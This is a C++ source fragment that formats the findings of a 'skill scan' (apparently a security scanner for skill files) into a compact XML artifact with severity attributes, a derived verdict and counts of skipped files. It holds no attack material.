// one (path, finding) pair — the flattened cross-file record printSkillScanArtifact prints from. A plain
// value type (not a pointer into the caller's per-file vectors) so the artifact can be built by accumulating
// across a whole --scan-skills directory walk without lifetime games.
struct SkillScanRow
{
    std::string  path;
    SkillFinding finding;
};

// Lowercase, unpadded XML attribute form of a severity ("critical"/"warn"/"info") — DERIVED from
// skillSeverityStr (the single source of truth wrap.h's plain-text display already uses) rather than
// restating the SkillSeverity->name mapping in a second switch, which the clone detector correctly flags
// as a near-duplicate of skillSeverityStr's. skillSeverityStr pads with trailing spaces for column
// alignment ("WARN    "); stop at the first space to strip that padding.
inline std::string skillSeverityAttr( SkillSeverity s )
{
    std::string out;
    for( const char c : std::string_view( skillSeverityStr( s ) ) )
    {
        if( c == ' ' )
        {
            break;
        }
        out += char( std::tolower( static_cast<unsigned char>( c ) ) );
    }
    return out;
}

// Emit `<skillscan files=".." findings=".." [skipped=".."] [shown=".." capped="1"] verdict="clean|warn|critical">`
// + one `<f p="path:line" rule=".." sev=".."/>` per finding (capped at kSkillScanFindingCap), `</skillscan>`.
// Deterministic: rows print in the caller's existing (file, line, rule) order — never re-sorted here.
// `verdict=` is derived from the SAME severities as skillScanExitCode (0/1/2 <-> clean/warn/critical), so
// it can never disagree with the exit code the caller separately returns.
//
// §B13.3: `filesSkipped` is how many files the caller's walk SAW and could not scan (binary content, or
// unreadable) — the other half of the population `files=` counts. A verdict must not be silently narrower
// than its subject, and "clean" over a directory whose executables were never opened is exactly that.
// Emitted only when non-zero (the house rule: absent = nothing skipped, so every existing artifact and gate
// stays byte-identical), and defaulted so the single-file entry point — which scans the one file it is given
// and skips nothing — needs no change.
inline void printSkillScanArtifact( std::FILE* out, const std::vector<SkillScanRow>& rows, int filesScanned, int filesSkipped = 0 ) noexcept
{
    int maxSev = 0;
    for( const SkillScanRow& r : rows )
    {
        if( int( r.finding.sev ) > maxSev )
        {
            maxSev = int( r.finding.sev );
        }
    }
    const char* verdict = maxSev == 2 ? "critical" : ( maxSev == 1 ? "warn" : "clean" );

    const std::size_t total  = rows.size();
    const std::size_t shown  = total < kSkillScanFindingCap ? total : kSkillScanFindingCap;
    const bool         capped = shown < total;

    std::fprintf( out, "<skillscan files=\"%d\" findings=\"%zu\"", filesScanned, total );
    if( filesSkipped > 0 )
    {
        std::fprintf( out, " skipped=\"%d\"", filesSkipped );
    }
    if( capped )
    {
        std::fprintf( out, " shown=\"%zu\" capped=\"1\"", shown );
    }
    std::fprintf( out, " verdict=\"%s\">", verdict );
    for( std::size_t i = 0; i < shown; ++i )
    {
        const SkillScanRow& r = rows[i];
        std::fprintf( out, "<f p=\"%s:%d\" rule=\"%s\" sev=\"%s\"/>",
                     escapeXmlAttr( r.path ).c_str(), r.finding.line, r.finding.rule, skillSeverityAttr( r.finding.sev ).c_str() );
    }
    std::fprintf( out, "</skillscan>\n" );
}

}   // namespace rw
